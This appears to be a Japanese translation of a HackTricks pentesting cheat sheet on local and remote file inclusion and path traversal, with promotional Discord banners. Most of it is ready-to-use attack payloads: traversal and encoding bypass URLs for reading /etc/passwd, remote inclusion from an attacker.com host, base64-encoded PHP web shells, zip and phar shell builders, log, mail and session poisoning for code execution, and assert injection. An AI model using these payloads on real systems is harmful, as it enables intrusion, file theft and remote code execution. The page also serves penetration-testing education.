# ファイルインクルージョン/パストラバーサル

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を見たい**ですか？または、**PEASSの最新バージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために、[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、速いペースのハッキングの世界に追いつく

**最新のアナウンスメント**\
新しいバグバウンティの開始や重要なプラットフォームの更新情報を入手する

**Discord**に[**参加する**](https://discord.com/invite/N3FrSbmwdy)と、今日からトップハッカーと協力を始めましょう！

## ファイルインクルージョン

**リモートファイルインクルージョン (RFI):** ファイルはリモートサーバーからロードされます（最適: コードを書いてサーバーが実行します）。phpではこれはデフォルトで**無効**です（**allow\_url\_include**）。\
**ローカルファイルインクルージョン (LFI):** サーバーはローカルファイルをロードします。

この脆弱性は、ユーザーが何らかの方法でサーバーによってロードされるファイルを制御できる場合に発生します。

脆弱な**PHP関数**: require, require\_once, include, include\_once

この脆弱性を利用するための興味深いツール: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## 盲目 - 興味深い - LFI2RCEファイル
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**いくつかの\*nix LFIリストを混合し、さらにパスを追加して、このリストを作成しました：**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/`を`\`に変更してみてください。\
また、`../../../../../`を追加してみてください。

/etc/passwordファイルを見つけるためにいくつかの技術を使用するリスト（脆弱性が存在するかどうかを確認するため）は[こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)で見つけることができます。

### **Windows**

いくつかのリストを統合して、以下を作成しました：

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/`を`\`に変更してみてください。\
また、`C:/`を削除し、`../../../../../`を追加してみてください。

/boot.iniファイルを見つけるためにいくつかの技術を使用するリスト（脆弱性が存在するかどうかを確認するため）は[こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)で見つけることができます。

### **OS X**

LinuxのLFIリストを確認してください。

## 基本的なLFIとバイパス

すべての例はLocal File Inclusionに対してですが、Remote File Inclusionにも適用可能です（例：page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/）。
```
http://example.com/index.php?page=../../../etc/passwd
```
### トラバーサルシーケンスが非再帰的に剥がされる
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

提供された文字列の末尾に追加される文字をバイパスします（バイパス対象：$\_GET\['param']."php"）
```
http://example.com/index.php?page=../../../etc/passwd%00
```
This is **PHP 5.4以降で解決済みです**

### **エンコーディング**

非標準のエンコーディングを使用することができます。例えば、ダブルURLエンコード（その他もあります）：
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 既存のフォルダから

バックエンドがフォルダパスをチェックしているかもしれません：
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### サーバー上のフォルダーを特定する

アプリケーションコードや許可された文字によっては、ファイルだけでなくフォルダーを再帰的に探索してファイルシステムを探ることが可能かもしれません。これを行うためには：

* 現在のディレクトリの「深さ」を、Linux上であれば `/etc/passwd` を成功裏に取得することで特定します：
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* 現在のディレクトリにあるフォルダ名を推測して追加します（ここでは、`private`）、そして `/etc/passwd` に戻ります：
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* アプリケーションが脆弱である場合、リクエストには2つの異なる結果が生じる可能性があります：
* エラーが発生するか出力がない場合、`private` フォルダはこの場所に存在しません
* `/etc/passwd` の内容が表示された場合、現在のディレクトリに実際に `private` フォルダがあることが確認されます
* この技術を使用して発見したフォルダは、ファイルに対して（従来のLFIメソッドを使用して）ファジングすることができます。または、同じ技術を再帰的に使用してサブディレクトリに対してファジングすることができます。

この技術は、ファイルシステム内の任意の場所にあるディレクトリを見つけるために適応させることが可能です。例えば、同じ仮定（ファイルシステムの深さ3での現在のディレクトリ）の下で、`/var/www/` に `private` ディレクトリが含まれているかどうかを確認したい場合、以下のペイロードを使用します：
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
以下のコマンドシーケンスは、`sed` (1) を使用してペイロードを生成し、`ffuf` (2) のようなURLファジングツールの入力として利用することを可能にします：
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
$ ffuf -u http://owasp.ctf.intigriti.io/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -e '.php~,.php.old,.php.bak,.php.swp,.php.sav,.php.save'
```
もちろん、深さ/場所/入力ディレクトリリストに関しては、これらのペイロードをご自身のニーズに合わせて調整してください。

### **パス切り捨て**

提供された文字列の末尾に追加される文字をバイパスします（バイパス対象: $\_GET\['param']."php"）。
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
```
常に**偽のディレクトリ**（a/）を使ってパスを**開始**してください。

**この脆弱性はPHP 5.3で修正されました。**

### **フィルタバイパスのコツ**
```
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## リモートファイルインクルージョン

phpでは、**`allow_url_include`** が**オフ**になっているため、デフォルトでは無効です。これが**オン**になっている場合、サーバーからPHPファイルをインクルードしてRCEを取得することができます：
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
何らかの理由で **`allow_url_include`** が **On** になっているが、PHPが外部ウェブページへのアクセスを**フィルタリング**している場合、[この投稿によると](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)、例えばデータプロトコルとbase64を使用してb64 PHPコードをデコードし、RCEを取得することができます：

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
前のコードでは、攻撃者が`.txt`で終わる文字列が必要だったため、最後に`+.txt`が追加されました。そのため、文字列はそれで終わり、b64デコード後にその部分は単なるゴミとなり、実際のPHPコードが含まれ（そして実行される）ことになります。
{% endhint %}

`php://`プロトコルを**使用しない**別の例は以下の通りです：

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python ルート要素

Pythonでは、このようなコードで：
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ユーザーが**`file_name`**に**絶対パス**を渡すと、**以前のパスは単に削除されます**：
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
以下は、[ドキュメント](https://docs.python.org/3.10/library/os.path.html#os.path.join)によると意図された挙動です：

> もしコンポーネントが絶対パスであれば、それ以前の全てのコンポーネントは破棄され、絶対パスのコンポーネントから結合が続行されます。

## Java ディレクトリ一覧

Javaでパストラバーサルが発生し、**ディレクトリを要求する**と、ファイルではなく**ディレクトリのリストが返される**ようです。他の言語では（afaik）このようなことは起こりません。

## トップ25パラメーター

ローカルファイルインクルージョン（LFI）の脆弱性に対して脆弱である可能性があるトップ25のパラメーターのリストはこちらです（[リンク](https://twitter.com/trbughunters/status/1279768631845494787)より）：
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI を PHP ラッパーとプロトコルを使用して行う

### php://filter

PHP フィルターは、データが読み書きされる前に基本的な**変更操作を行う**ことを可能にします。フィルターには5つのカテゴリーがあります：

* [文字列フィルター](https://www.php.net/manual/ja/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: データからタグを削除します（"<" と ">" の間のすべて）
* このフィルターは現代の PHP バージョンからはなくなっていることに注意してください
* [変換フィルター](https://www.php.net/manual/ja/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : 異なるエンコーディングに変換します（`convert.iconv.<input_enc>.<output_enc>`）。サポートされている**すべてのエンコーディングのリスト**を取得するには、コンソールで実行します：`iconv -l`

{% hint style="warning" %}
`convert.iconv.*` 変換フィルターを悪用すると、**任意のテキストを生成**することができます。これは任意のテキストを書き込んだり、include 関数が任意のテキストを処理するようにするのに役立つかもしれません。詳細については [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) を確認してください。
{% endhint %}

* [圧縮フィルター](https://www.php.net/manual/ja/filters.compression.php)
* `zlib.deflate`: コンテンツを圧縮します（多くの情報を外部に持ち出す場合に便利です）
* `zlib.inflate`: データを解凍します
* [暗号化フィルター](https://www.php.net/manual/ja/filters.encryption.php)
* `mcrypt.*` : 廃止予定
* `mdecrypt.*` : 廃止予定
* その他のフィルター
* PHP で `var_dump(stream_get_filters());` を実行すると、いくつかの**予期しないフィルター**を見つけることができます：
* `consumed`
* `dechunk`: HTTP チャンクエンコーディングを逆にします
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
部分 "php://filter" は大文字小文字を区別しません
{% endhint %}

### php://fd

このラッパーは、プロセスが開いているファイルディスクリプタにアクセスすることを可能にします。開いているファイルの内容を抜き出すのに役立つ可能性があります：
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
### zip:// と rar://

PHPShellが内蔵されたZipまたはRarファイルをアップロードしてアクセスします。\
rarプロトコルを悪用するためには、**特に有効にする必要があります**。
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

(このセクションには翻訳するべきテキストが含まれていません。)
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### expect://

Expectは有効にされている必要があります。これを使用してコードを実行できます。
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POSTパラメータにペイロードを指定します
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

`.phar` ファイルは、ウェブが `include` のような関数を使用してファイルをロードしている場合、PHPコードを実行するためにも使用できます。

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
```
そして、以下の行を実行することで`phar`をコンパイルできます:
```
```bash
php --define phar.readonly=0 create_path.php
```
`test.phar` というファイルが生成され、LFIを悪用するために使用できます。

LFIがファイル内のPHPコードを実行せずに読み取っている場合、例えば _**file\_get\_contents(), fopen(), file() や file\_exists(), md5\_file(), filemtime() や filesize()**_**.** などの関数を使用している場合、**phar** プロトコルを使用してファイルを**読み取る**際に発生する **デシリアライゼーション**を悪用しようとすることができます。\
詳細については、以下の投稿を読んでください:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### その他のプロトコル

こちらで可能な[ **プロトコルをさらに確認してください**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory と php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — メモリまたは一時ファイルに書き込む（ファイルインクルージョン攻撃でどのように役立つかは不明）
* [file://](https://www.php.net/manual/en/wrappers.file.php) — ローカルファイルシステムにアクセス
* [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URLにアクセス
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URLにアクセス
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 圧縮ストリーム
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — パターンにマッチするパス名を検索（印刷可能なものを返さないので、ここではあまり役に立たない）
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — セキュアシェル 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — オーディオストリーム（任意のファイルを読むためには役に立たない）

## PHPの 'assert' を利用したLFI

".." のようなトラバーサル文字列をフィルタリングしているようで、"Hacking attempt" や "Nice try!" といった反応がある難しいLFIに遭遇した場合、'assert' インジェクションペイロードが機能するかもしれません。

このようなペイロードです:
```
' and die(show_source('/etc/passwd')) or '
```
PHPコードを次のような「file」パラメーターで正常にエクスプロイトします：
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
脆弱な "assert" ステートメントを使用して、system() 関数を用いて RCE を取得することも可能です：
```
' and die(system("whoami")) or '
```
ペイロードを送信する前に、必ずURLエンコードしてください。

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために、[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、速いペースのハッキングの世界に追いつく

**最新のアナウンスメント**\
最新のバグバウンティの開始と重要なプラットフォームの更新情報を入手する

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)に参加して、今日からトップハッカーと協力しましょう！

## PHP Blind Path Traversal

{% hint style="warning" %}
この技術は、**PHP関数**の**ファイルパス**を**制御**している場合に関連しますが、ファイルの内容は表示されません（例えば、**`file()`**の単純な呼び出しのように）。しかし、ファイルの内容は表示されません。
{% endhint %}

[**この素晴らしい投稿**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)では、エラーオラクルを介してファイルの内容を**抽出する**ために、ブラインドパストラバーサルがPHPフィルターを介してどのように悪用されるかが説明されています。

要約すると、この技術は**"UCS-4LE"エンコーディング**を使用して、ファイルの内容を非常に**大きく**し、PHP関数がファイルを開く際に**エラー**を引き起こします。

次に、フィルター**`dechunk`**を使用して最初の文字を漏洩させ、他のフィルター（**base64**や**rot13**など）と組み合わせて、最終的には**convert.iconv.UCS-4.UCS-4LE**と**convert.iconv.UTF16.UTF-16BE**フィルターを使用して、他の文字を先頭に配置し、それらを漏洩させます。

**脆弱性がある可能性のある関数**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

技術的な詳細については、上記の投稿をチェックしてください！

## LFI2RCE

### Remote File Inclusion

以前に説明した通り、[**このリンクをフォローしてください**](./#remote-file-inclusion)。

### Apache/Nginxログファイル経由

ApacheまたはNginxサーバーが**LFIに脆弱**である場合、include関数内で**`/var/log/apache2/access.log`または`/var/log/nginx/access.log`**にアクセスしようとすることができます。**ユーザーエージェント**内または**GETパラメーター**内にphpシェルを設定し、**`<?php system($_GET['c']); ?>`**のようなファイルを含めることができます。

{% hint style="warning" %}
シェルに**単引用符**の代わりに**二重引用符**を使用する場合、二重引用符は文字列"_**quote;**_"に変更され、**PHPはそこでエラーを投げ**、それ以外のことは**実行されません**。

また、ペイロードを**正しく書く**ことを確認してください。そうでないとPHPはログファイルを読み込もうとするたびにエラーを出し、二度目のチャンスはありません。
{% endhint %}

これは他のログでも行うことができますが、ログ内のコードがURLエンコードされている可能性があり、これによってシェルが破壊される可能性があります。ヘッダー**authorisation "basic"**にはBase64でエンコードされた"user:password"が含まれており、ログ内でデコードされます。PHPShellはこのヘッダー内に挿入することができます。\
他の可能なログパス：
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing ワードリスト: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### メール経由

**メールを送信**して、PHPペイロード（例：`<?php echo system($_REQUEST["cmd"]); ?>`）を内部アカウント（user@localhost）に含め、**`/var/mail/<USERNAME>`** や **`/var/spool/mail/<USERNAME>`** のようなパスでユーザーのメールをインクルードしようとします。

### /proc/\*/fd/\* 経由

1. 多くのシェルをアップロードします（例：100個）
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) をインクルードします。ここで $PID = プロセスのPID（ブルートフォース可能）、$FD = ファイルディスクリプタ（これもブルートフォース可能）

### /proc/self/environ 経由

ログファイルのように、ペイロードをUser-Agentに送信します。これは /proc/self/environ ファイル内に反映されます。
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### アップロードを通じて

ファイルをアップロードできる場合は、シェルペイロードをその中に注入してください（例： `<?php system($_GET['c']); ?>`）。
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ファイルを読みやすく保つためには、写真/ドキュメント/PDFのメタデータに注入するのが最適です

### ZIPファイルアップロード経由

PHPシェルが圧縮されたZIPファイルをアップロードしてアクセスします：
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHPセッションを介して

ウェブサイトがPHPセッション（PHPSESSID）を使用しているか確認してください
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP, these sessions are stored into _/var/lib/php5/sess\\_\[PHPSESSID]\_ ファイルに保存されます。
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
クッキーを `<?php system('cat /etc/passwd');?>` に設定します。
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
```
PHPセッションファイルを含めるためにLFIを使用する
```
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh経由

sshがアクティブな場合、使用されているユーザーを確認してください（/proc/self/status & /etc/passwd）し、**\<HOME>/.ssh/id\_rsa** にアクセスを試みてください。

### **vsftpd** _**ログ**_ 経由

このFTPサーバーのログは _**/var/log/vsftpd.log**_ に保存されています。LFIを利用して露出したvsftpdサーバーにアクセスできる場合、ユーザー名にPHPペイロードを設定してログインを試み、その後LFIを使用してログにアクセスすることができます。

### php base64フィルターを使用（base64を使用して）

[この](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64)記事に示されているように、PHPのbase64フィルターは非base64を無視します。これを利用してファイル拡張子のチェックをバイパスできます：base64が".php"で終わるものを提供すると、"."を無視してbase64に"php"を追加します。以下に例のペイロードを示します：
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### phpフィルタを使用（ファイル不要）

この[**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)では、**phpフィルタを使用して任意の内容を出力として生成**できることを説明しています。つまり、ファイルに書き込む**必要なく**、include用の**任意のphpコードを生成**できるということです。

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### セグメンテーションフォールトを利用

`/tmp`に**一時的に**保存されるファイルを**アップロード**し、**同じリクエストで**、**セグメンテーションフォールト**を引き起こします。そうすると、**一時ファイルが削除されず**、それを探すことができます。

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginxの一時ファイルストレージを利用

**Local File Inclusion**を見つけ、PHPの前で**Nginx**が動作している場合、次の技術でRCEを得ることができるかもしれません：

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESSを利用

**Local File Inclusion**を見つけ、セッションが**なく**、`session.auto_start`が`Off`であっても、**`PHP_SESSION_UPLOAD_PROGRESS`**を**multipart POST**データで提供すると、PHPが自動的にセッションを**有効にします**。これを悪用してRCEを得ることができます：

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windowsでの一時ファイルアップロードを利用

**Local File Inclusion**を見つけ、サーバーが**Windows**で動作している場合、RCEを得ることができるかもしれません：

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo()を利用（file\_uploads = on）

**Local File Inclusion**を見つけ、file\_uploads = onで**phpinfo()**を公開しているファイルがある場合、RCEを得ることができます：

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + パス開示を利用

**Local File Inclusion**を見つけ、一時ファイルのパスを**外部に漏らすことができる**が、サーバーがインクルードされるファイルにPHPのマークがあるか**チェックしている場合**、この**Race Condition**を利用してチェックを**回避**することができます：

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### 永遠の待機 + ブルートフォースを利用

LFIを悪用して**一時ファイルをアップロード**し、PHPの実行をサーバーが**停止**させることができれば、数時間にわたって**ファイル名をブルートフォース**して一時ファイルを見つけることができます：

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### 致命的なエラーに至る

以下のファイルのいずれかをインクルードすると、`/usr/bin/phar`、`/usr/bin/phar7`、`/usr/bin/phar.phar7`、`/usr/bin/phar.phar`。（そのエラーを投げるためには同じものを2回インクルードする必要があります。）

**これがどのように役立つかはわかりませんが、役立つかもしれません。**\
_PHP致命的エラーを引き起こしても、PHPの一時ファイルは削除されます。_

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## 参考文献

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために、[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルと課題に焦点を当てたコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、速いペースで変化するハッキングの世界を最新の状態に保つ

**最新のアナウンス**\
新しいバグバウンティの開始や重要なプラットフォームの更新情報を入手する

[**Discord**](https://discord.com/invite/N3FrSbmwdy)に**参加して**、今日からトップハッカーと協力しましょう！

<details>

